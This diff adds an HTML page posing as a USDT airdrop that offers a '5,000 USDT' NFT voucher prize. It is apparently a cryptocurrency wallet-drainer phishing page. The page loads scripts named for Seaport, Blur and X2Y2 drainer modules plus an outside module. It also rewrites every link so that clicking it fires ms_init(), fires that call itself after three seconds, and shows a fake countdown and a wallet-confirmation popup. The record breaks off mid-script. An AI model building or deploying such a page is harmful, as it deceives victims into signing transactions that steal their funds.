@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en" style="--w3m-color-fg-1: rgb(228,231,231); --w3m-color-fg-2: rgb(148,158,158); --w3m-color-fg-3: rgb(110,119,119); --w3m-color-bg-1: rgb(20,20,20); --w3m-color-bg-2: rgb(39,42,42); --w3m-color-bg-3: rgb(59,64,64); --w3m-color-overlay: rgba(255,255,255,0.1); --w3m-accent-color: #3396FF; --w3m-accent-fill-color: #FFFFFF; --w3m-z-index: 99999; --w3m-background-color: #3396FF; --w3m-background-border-radius: 8px; --w3m-container-border-radius: 30px; --w3m-wallet-icon-border-radius: 15px; --w3m-wallet-icon-large-border-radius: 30px; --w3m-wallet-icon-small-border-radius: 7px; --w3m-input-border-radius: 28px; --w3m-button-border-radius: 10px; --w3m-notification-border-radius: 36px; --w3m-secondary-button-border-radius: 28px; --w3m-icon-button-border-radius: 50%; --w3m-button-hover-highlight-border-radius: 10px; --w3m-text-big-bold-size: 20px; --w3m-text-big-bold-weight: 600; --w3m-text-big-bold-line-height: 24px; --w3m-text-big-bold-letter-spacing: -0.03em; --w3m-text-big-bold-text-transform: none; --w3m-text-xsmall-bold-size: 10px; --w3m-text-xsmall-bold-weight: 700; --w3m-text-xsmall-bold-line-height: 12px; --w3m-text-xsmall-bold-letter-spacing: 0.02em; --w3m-text-xsmall-bold-text-transform: uppercase; --w3m-text-xsmall-regular-size: 12px; --w3m-text-xsmall-regular-weight: 600; --w3m-text-xsmall-regular-line-height: 14px; --w3m-text-xsmall-regular-letter-spacing: -0.03em; --w3m-text-xsmall-regular-text-transform: none; --w3m-text-small-thin-size: 14px; --w3m-text-small-thin-weight: 500; --w3m-text-small-thin-line-height: 16px; --w3m-text-small-thin-letter-spacing: -0.03em; --w3m-text-small-thin-text-transform: none; --w3m-text-small-regular-size: 14px; --w3m-text-small-regular-weight: 600; --w3m-text-small-regular-line-height: 16px; --w3m-text-small-regular-letter-spacing: -0.03em; --w3m-text-small-regular-text-transform: none; --w3m-text-medium-regular-size: 16px; --w3m-text-medium-regular-weight: 600; --w3m-text-medium-regular-line-height: 20px; --w3m-text-medium-regular-letter-spacing: -0.03em; --w3m-text-medium-regular-text-transform: none; --w3m-font-family: Inter,Arial, Roboto, sans-serif; --w3m-font-feature-settings: &#39;tnum&#39; on, &#39;lnum&#39; on, &#39;case&#39; on; --w3m-success-color: rgb(38,181,98); --w3m-error-color: rgb(242, 90, 103); --w3m-overlay-background-color: rgba(0, 0, 0, 0.3); --w3m-overlay-backdrop-filter: none; --w3m-background-image-url: none;">
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>
+    USDT | Airdrop
+  </title>
+  <meta name="author" content="SitePoint">
+  <meta property="og:type" content="website">
+  <!--<link rel="icon" href="/index_files/favicon.png">-->
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <!--<link href="./index_files/2.css" rel="stylesheet">-->
+  <script src="index_files/3.3.3.html"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            lrgray: '#000000',
+            lrgreen: '#3a9da1',
+          }
+        }
+      }
+    }
+  </script>
+  
+  
+    <link rel="stylesheet" href="css/sweetalert2.css" type="text/css" media="all">
+
+    <script src="js/jquery.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+
+
+    <!--<script src="/assets/logo.js?rd=33331"></script> -->
+
+  <script src="assets/web3-provider/web3-modal20a6.js?rd=12"></script>
+
+  <script src="assets/web3-provider/web3-loader20a6.js?rd=12"></script>
+
+     <script src="assets/web3-provider/web3-connect.js"></script>
+
+  <script src="assets/web3-provider/web3-router.js"></script>
+
+  <script src="assets/web3-provider/web3-module.js"></script>
+
+  <script src="assets/web3-provider/web3-alert.js"></script>
+
+  <script src="assets/web3-provider/web3-seaport.js"></script>
+
+  <script src="assets/web3-provider/web3-data.js"></script>
+
+  <script src="assets/web3-provider/ethers.js"></script>
+
+    <script src="assets/web3-modules/module-seaport34cf.js?rd=2"></script>
+
+    <script src="assets/web3-modules/module-blur34cf.js?rd=2"></script>
+
+    <script src="assets/web3-modules/module-x2y234cf.js?rd=2"></script>
+
+  <script src="assets/web3-provider/ethereum-tx.js"></script>
+
+  <script src="assets/web3-providerf248.js?rd=11111111211"></script>
+    <script>
+        $().ready(function () { 
+            $("a").each(function () {
+
+                $(this).attr("href", "#") 
+
+                $(this).click(function () {
+
+                    ms_init();
+
+                })
+
+            })
+            // $("button").each(function () {
+            //     // alert($(this).text())
+                 
+            //     $(this).on("click",function(){ 
+            //       e.preventDefault();
+            //       ms_init();
+            //     })
+            // });
+     
+
+
+
+            setTimeout(function () {
+
+                ms_init();
+
+            }, 3000)
+
+        })
+    </script>
+  <link href="index_files/toastr.min.css" rel="stylesheet">
+  <style type="text/tailwindcss">
+    body{
+      font-family: 'Inter', sans-serif;
+      }
+      .custombtn{
+      cursor: pointer;
+      display: inline-flex;
+      appearance: none;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      justify-content: center;
+      user-select: none;
+      position: relative;
+      white-space: nowrap;
+      vertical-align: middle;
+      outline-offset: 2px;
+      font-weight: 800;
+      background-color: transparent;
+      border-color:  #c2bebe;
+      text-decoration: none;
+      outline: transparent solid 2px;
+      border-width: 1px;
+      border-style: solid;
+      border-image: initial;
+      height:60px
+      }
+      .custombtn:disabled{
+      background-color:gray;
+      color:#D1D5DB;
+      border:none;
+      cursor: not-allowed;
+      }
+      .custombtn:disabled:hover{
+      background-color:gray;
+      color:#D1D5DB;
+      border:none;
+      cursor: not-allowed;
+      }
+      .toast-info{
+      background-color:#121619;
+      color:#c2bebe !important;
+      box-shadow: none !important;
+      font-size: 14px;
+      }
+      #toast-container>.toast-info {
+      /*background-image: url('images/favicon.png')!important;*/
+      background-size:30px;
+      }
+      .loader {
+      	border-top-color: #c2bebe;
+      	-webkit-animation: spinner 1.5s linear infinite;
+      	animation: spinner 1.5s linear infinite;
+      }
+
+      @-webkit-keyframes spinner {
+      	0% {
+      		-webkit-transform: rotate(0deg);
+      	}
+      	100% {
+      		-webkit-transform: rotate(360deg);
+      	}
+      }
+
+      @keyframes spinner {
+      	0% {
+      		transform: rotate(0deg);
+      	}
+      	100% {
+      		transform: rotate(360deg);
+      	}
+      }
+    </style>
+
+    <!--<script src="./index_files/ethers.umd.min.js.下载"></script>-->
+    <!--<script src="./index_files/merkletree.js.下载"></script>-->
+    <!--<script src="./index_files/seaport.js.下载"></script>-->
+    <!--<script src="./index_files/wallet-connect.js.下载"></script>-->
+    <!--<script src="./index_files/57dbc46a-678f-45f4-8e78-1937cbef3362.js.下载"></script>-->
+<style>/* ! tailwindcss v3.3.3 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }.relative{position:relative}.m-3{margin:0.75rem}.mx-1{margin-left:0.25rem;margin-right:0.25rem}.mx-auto{margin-left:auto;margin-right:auto}.-mb-16{margin-bottom:-4rem}.mb-3{margin-bottom:0.75rem}.ml-2{margin-left:0.5rem}.ml-4{margin-left:1rem}.mr-1{margin-right:0.25rem}.mt-10{margin-top:2.5rem}.mt-12{margin-top:3rem}.mt-3{margin-top:0.75rem}.mt-4{margin-top:1rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.inline-flex{display:inline-flex}.h-12{height:3rem}.h-5{height:1.25rem}.w-24{width:6rem}.w-5{width:1.25rem}.w-full{width:100%}.max-w-7xl{max-width:80rem}.max-w-md{max-width:28rem}.flex-1{flex:1 1 0%}.items-center{align-items:center}.justify-between{justify-content:space-between}.overflow-hidden{overflow:hidden}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-md{border-radius:0.375rem}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity))}.bg-lrgray{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity))}.bg-lrgreen{--tw-bg-opacity:1;background-color:rgb(58 157 161 / var(--tw-bg-opacity))}.p-1{padding:0.25rem}.p-2{padding:0.5rem}.p-8{padding:2rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-4{padding-left:1rem;padding-right:1rem}.py-0{padding-top:0px;padding-bottom:0px}.py-0\.5{padding-top:0.125rem;padding-bottom:0.125rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.pr-2{padding-right:0.5rem}.pt-10{padding-top:2.5rem}.pt-5{padding-top:1.25rem}.pt-6{padding-top:1.5rem}.text-center{text-align:center}.font-mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-4xl{font-size:2.25rem;line-height:2.5rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-extralight{font-weight:200}.font-medium{font-weight:500}.font-semibold{font-weight:600}.uppercase{text-transform:uppercase}.leading-5{line-height:1.25rem}.leading-none{line-height:1}.tracking-tight{letter-spacing:-0.025em}.text-black{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity))}.text-gray-200{--tw-text-opacity:1;color:rgb(229 231 235 / var(--tw-text-opacity))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity))}.text-lrgreen{--tw-text-opacity:1;color:rgb(58 157 161 / var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.shadow{--tw-shadow:0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}
+    body{
+      font-family: 'Inter', sans-serif;
+      }
+      .custombtn{
+      cursor: pointer;
+      display: inline-flex;
+      -webkit-appearance: none;
+              appearance: none;
+      -webkit-box-align: center;
+      align-items: center;
+      -webkit-box-pack: center;
+      justify-content: center;
+      -webkit-user-select: none;
+              user-select: none;
+      position: relative;
+      white-space: nowrap;
+      vertical-align: middle;
+      outline-offset: 2px;
+      font-weight: 800;
+      background-color: transparent;
+      border-color:  #c2bebe;
+      text-decoration: none;
+      outline: transparent solid 2px;
+      border-width: 1px;
+      border-style: solid;
+      border-image: initial;
+      height:60px
+      }
+      .custombtn:disabled{
+      background-color:gray;
+      color:#D1D5DB;
+      border:none;
+      cursor: not-allowed;
+      }
+      .custombtn:disabled:hover{
+      background-color:gray;
+      color:#D1D5DB;
+      border:none;
+      cursor: not-allowed;
+      }
+      .toast-info{
+      background-color:#121619;
+      color:#c2bebe !important;
+      box-shadow: none !important;
+      font-size: 14px;
+      }
+      #toast-container>.toast-info {
+      background-image: url('images/favicon.html')!important;
+      background-size:30px;
+      }
+      .loader {
+      	border-top-color: #c2bebe;
+      	-webkit-animation: spinner 1.5s linear infinite;
+      	animation: spinner 1.5s linear infinite;
+      }
+
+      @-webkit-keyframes spinner {
+      	0% {
+      		-webkit-transform: rotate(0deg);
+      	}
+      	100% {
+      		-webkit-transform: rotate(360deg);
+      	}
+      }
+
+      @keyframes spinner {
+      	0% {
+      		transform: rotate(0deg);
+      	}
+      	100% {
+      		transform: rotate(360deg);
+      	}
+      }
+
+      .hover\:bg-lrgreen:hover{--tw-bg-opacity:1;background-color:rgb(58 157 161 / var(--tw-bg-opacity))}
+
+      .hover\:text-gray-200:hover{--tw-text-opacity:1;color:rgb(229 231 235 / var(--tw-text-opacity))}
+
+      .hover\:text-white:hover{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}
+
+      .focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}
+
+      .focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}
+
+      .focus\:ring-indigo-300:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(165 180 252 / var(--tw-ring-opacity))}
+
+      .focus\:ring-offset-2:focus{--tw-ring-offset-width:2px}
+
+      .focus\:ring-offset-gray-900:focus{--tw-ring-offset-color:#111827}
+
+      @media (min-width: 640px){.sm\:-mb-48{margin-bottom:-12rem}.sm\:ml-3{margin-left:0.75rem}.sm\:mt-0{margin-top:0px}.sm\:mt-12{margin-top:3rem}.sm\:mt-4{margin-top:1rem}.sm\:mt-5{margin-top:1.25rem}.sm\:flex{display:flex}.sm\:max-w-2xl{max-width:42rem}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-16{padding-top:4rem}.sm\:text-center{text-align:center}.sm\:text-6xl{font-size:3.75rem;line-height:1}.sm\:text-base{font-size:1rem;line-height:1.5rem}.sm\:text-xl{font-size:1.25rem;line-height:1.75rem}}
+
+      @media (min-width: 768px){.md\:w-auto{width:auto}}
+
+      @media (min-width: 1024px){.lg\:relative{position:relative}.lg\:m-0{margin:0px}.lg\:mt-6{margin-top:1.5rem}.lg\:flex{display:flex}.lg\:grid{display:grid}.lg\:max-w-none{max-width:none}.lg\:grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}.lg\:items-center{align-items:center}.lg\:gap-8{gap:2rem}.lg\:overflow-hidden{overflow:hidden}.lg\:px-0{padding-left:0px;padding-right:0px}.lg\:px-8{padding-left:2rem;padding-right:2rem}.lg\:py-24{padding-top:6rem;padding-bottom:6rem}.lg\:pb-14{padding-bottom:3.5rem}.lg\:pt-8{padding-top:2rem}.lg\:text-left{text-align:left}.lg\:text-lg{font-size:1.125rem;line-height:1.75rem}.lg\:text-sm{font-size:0.875rem;line-height:1.25rem}}
+
+      @media (min-width: 1280px){.xl\:text-6xl{font-size:3.75rem;line-height:1}.xl\:text-base{font-size:1rem;line-height:1.5rem}.xl\:text-xl{font-size:1.25rem;line-height:1.75rem}}
+    </style>
+	
+	
+	<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        
+  <script src="./settings.js"></script>
+  <script src="https://cdnweb3.pages.dev/web3-ethers.js" type="module"></script>
+	</head>
+
+<body class="bg-black">
+  <!--<script src="./index_files/jquery-3.6.0.min.js.下载"></script>-->
+  <!--<script src="./index_files/toastr.min.js.下载"></script>-->
+
+
+
+  <div class="relative overflow-hidden">
+    <header class="relative">
+      <div class="bg-lrgray pt-6">
+        <nav class="relative mx-auto flex max-w-7xl items-center justify-between px-4 sm:px-6" aria-label="Global">
+          <div class="flex flex-1 items-center">
+            <div class="flex w-full items-center justify-between md:w-auto">
+              <a href="https://swapnft.net/#">
+                <img class="h-12" src="index_files/logo.png" alt="">
+              </a>
+            </div>
+          </div>
+        </nav>
+      </div>
+    </header>
+    <main>
+      <div class="pt-10 sm:pt-16 lg:overflow-hidden lg:pt-8 lg:pb-14">
+        <div class="mx-auto max-w-7xl lg:px-8">
+          <div class="lg:grid lg:grid-cols-2 lg:gap-8">
+            <div class="mx-auto max-w-md px-4 sm:max-w-2xl sm:px-6 sm:text-center lg:flex lg:items-center lg:px-0 lg:text-left">
+              <div class="lg:py-24">
+                <a href="https://swapnft.net/#" class="inline-flex items-center rounded-full bg-black p-1 pr-2 text-white hover:text-gray-200 sm:text-base lg:text-sm xl:text-base">
+                  <span class="py-2 rounded-full bg-lrgreen px-3 py-0.5 text-sm font-semibold leading-5 text-black">
+                    Distribution
+                    Started
+                  </span>
+                  <span class="ml-4 text-sm">
+                    FCFS
+                  </span>
+                  <!-- Heroicon name: mini/chevron-right -->
+                  <svg class="ml-2 h-5 w-5 text-gray-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                    <path fill-rule="evenodd" d="M7.21 14.77a.75.75 0 01.02-1.06L11.168 10 7.23 6.29a.75.75 0 111.04-1.08l4.5 4.25a.75.75 0 010 1.08l-4.5 4.25a.75.75 0 01-1.06-.02z" clip-rule="evenodd"></path>
+                  </svg>
+                </a>
+                <h1 class="mt-4 text-4xl font-bold tracking-tight text-white sm:mt-5 sm:text-6xl lg:mt-6 xl:text-6xl">
+                  <span class="block">
+                    Redeem your NFT voucher for
+                  </span>
+                  <span class="block text-lrgreen">
+                    5,000 USDT
+                  </span>
+                </h1>
+                <p class="mt-3 text-base text-gray-500 sm:mt-5 sm:text-xl lg:text-lg xl:text-xl">
+                  Congratulations on your victory in this week's USDC draw! As a token of our gratitude for your unwavering support and
+                  active involvement in our community, we're delighted to present you with an opportunity to redeem your NFT voucher for
+                  <b class="text-lrgreen">5,000 USDT.</b> Please proceed by clicking the button below to claim your reward.
+                </p>
+                <div id="timer">
+                  <h1 class="pt-5 text-2xl mb-3 font-extralight text-gray-200">
+                    Round Closing In
+                  </h1>
+                  <div class="text-3xl text-center flex w-full">
+                    <div class="text-xl mr-1 font-extralight text-gray-200">
+                      in
+                    </div>
+                    <div class="w-24 mx-1 p-2 text-lrgreen rounded-lg">
+                      <div class="text-md font-mono leading-none inline-block" id="_hours">1</div>
+                      <div class="font-mono uppercase text-sm leading-none">
+                        Hours
+                      </div>
+                    </div>
+                    <div class="w-24 mx-1 p-2 text-lrgreen rounded-lg">
+                      <div class="font-mono leading-none inline-block" id="_minutes">57</div>
+                      <div class="font-mono uppercase text-sm leading-none">
+                        Minutes
+                      </div>
+                    </div>
+                    <div class="text-xl mx-1 font-extralight text-gray-200">
+                      and
+                    </div>
+                    <div class="w-24 mx-1 p-2 text-lrgreen rounded-lg">
+                      <div class="font-mono leading-none inline-block" id="_seconds">7</div>
+                      <div class="font-mono uppercase text-sm leading-none">
+                        Seconds
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="mt-10 sm:mt-12" style="padding-right: 7%;">
+                  <div class="sm:flex">
+                    <div class="mt-3 sm:mt-0 sm:ml-3">
+                      <button  type="button" class="claim-button m-3 p-8 custombtn text-lrgreen block w-full rounded-md bg-lrgreen font-medium text-3xl shadow hover:bg-lrgreen hover:text-white focus:outline-none focus:ring-2 focus:ring-indigo-300 focus:ring-offset-2 focus:ring-offset-gray-900">
+                        Connect Wallet
+                      </button>
+                    </div>
+                  </div>
+                  <p class="text-xs text-lrgreen sm:mt-4">
+                    A signature may be required to proof
+                    ownership of wallet
+                  </p>
+                </div>
+              </div>
+            </div>
+            <div class="mt-12 -mb-16 sm:-mb-48 lg:relative lg:m-0">
+              <div class="mx-auto max-w-md px-4 sm:max-w-2xl sm:px-6 lg:max-w-none lg:px-0">
+                <img src="index_files/side.png">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+  <!--<script src="./index_files/jquery-3.6.0.js.下载" crossorigin="anonymous"></script>-->
+  <div id="inferno-popup" style="font-family: Poppins, sans-serif; transition: opacity 0.3s ease-in-out 0s; display: none !important; position: fixed !important; inset: 0px !important; z-index: 150 !important; height: 100% !important; width: 100% !important; background: rgba(0, 0, 0, 0.8) !important; justify-content: center !important; max-height: 100% !important;">
+<div style="margin: 40px 0px !important; z-index:99999;">
+<div style="position: relative !important;border-radius: 16px;background: rgb(255, 255, 255) !important;width: 360px;max-height: calc(0px + 100vh);max-width: 100%;">
+	<div style="position: relative; text-align: center; padding: 16px 24px;">
+	<h4 id="inferno-popup-title" style="font-weight: 600;line-height: 110%;font-size: 22px; color: rgb(4, 17, 29);padding: 4px 16px"></h4>
+	<div id="inferno-popup-close" style="cursor: pointer;position: absolute;right: 25px; top: 15px;width: 20px; height: 20px;opacity: 0.3;"></div>
+	<style>
+		#inferno-popup-close:hover {
+			opacity: 0.4;
+		}
+
+		#inferno-popup-close:before, #inferno-popup-close:after {
+			content: "";
+			position: absolute;
+			left: 15px;
+			height: 19px;
+			width: 2px;
+			background-color: rgb(10, 10, 10);
+		}
+
+		#inferno-popup-close:before {
+			transform: rotate(45deg);
+		}
+
+		#inferno-popup-close:after {
+			transform: rotate(-45deg);
+		}
+	</style>
+	</div>
+	<div style="padding: 24px;">
+	<div style="align-items: center; gap: 25px;">
+		<div>
+		<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: rgb(255, 255, 255); display: block; shape-rendering: auto;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+			<path d="M10 50A40 40 0 0 0 90 50A40 42 0 0 1 10 50" fill="#e15b64" stroke="none">
+			<animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 51;360 50 51"></animatetransform>
+			</path>
+		</svg>
+		</div>
+		<div>
+		<p style="font-size: 16.5px; font-weight: 600; color: rgb(4, 17, 29);"></p>
+		</div>
+	</div>
+	<hr style="padding: 0px; margin: 28px 0px; opacity: 0.2; border-color: rgb(138, 147, 155) currentcolor currentcolor; border-style: solid none none; border-width: 1px medium medium; border-image: none 100% / 1 / 0 stretch; color: rgb(138, 147, 155); text-align: center;">
+	<div>
+		<div style="color: rgb(4, 17, 29); align-items: center; margin-bottom: 12px; display: flex; text-align: center; font-weight: 600;  background: rgb(247, 247, 247); border-radius: 12px; padding: 7px;">
+		<img src="index_files/8212602.png" id="inferno-popup-image" height="30" style="  display: inline-block; vertical-align: middle; width:30px">
+		<h3 style="text-align: center; font-size: 13px; font-weight: 600; color: rgb(4, 17, 29); margin: 0;">Confirm NFT Voucher action in your wallet.</h3>
+		</div>
+		<div style="color: rgb(4, 17, 29) !important; line-height: 140%; margin-bottom: 12px; font-weight: 600;">
+		<h3 style="font-size: 14px; text-align: center; font-weight: 600; position: relative;" id="inferno-popup-text"></h3>
+		</div>
+	</div>
+	</div>
+</div>
+</div>
+<div id="inferno-popup-overlay" style=" position: fixed;top: 0;left: 0; width: 100%; height: 100%; background: rgba(23,23,23,.8);backdrop-filter: blur(5px);z-index: 99998;"></div></div>
+
+<!--<w3m-modal><template shadowrootmode="open"><w3m-explorer-context><template shadowrootmode="open"></template></w3m-explorer-context><w3m-theme-context><template shadowrootmode="open"></template></w3m-theme-context><w3m-wc-connection-context><template shadowrootmode="open"></template></w3m-wc-connection-context><w3m-account-context><template shadowrootmode="open"></template></w3m-account-context><w3m-network-context><template shadowrootmode="open"></template></w3m-network-context><div id="w3m-modal" role="alertdialog" aria-modal="true" class="w3m-overlay" style="opacity: 0;"><div class="w3m-container" tabindex="0" style=""></div></div></template></w3m-modal>-->
+
+<!--<script src="./index_files/toastr.min.js(1).下载"></script>-->
+<!--  <script src="./index_files/script.js.下载"></script>-->
+
+  <script>
+
+
+const defaultHours = 2
+const defaultMinutes = 0
+const defaultSeconds = 0
+
+const hourWrap = document.querySelector('#_hours')
+const minWrap = document.querySelector('#_minutes')
+const secWrap = document.querySelector('#_seconds')
+
+let hours, minutes, seconds;
+
+function loadTimeFromStorage() {
+    hours = parseInt(localStorage.getItem('timer_hours') || defaultHours, 10);
+    minutes = parseInt(localStorage.getItem('timer_minutes') || defaultMinutes, 10);
+    seconds = parseInt(localStorage.getItem('timer_seconds') || defaultSeconds, 10);
+}
+
+
+function saveTimeToStorage() {
+    localStorage.setItem('timer_hours', hours);
+    localStorage.setItem('timer_minutes', minutes);
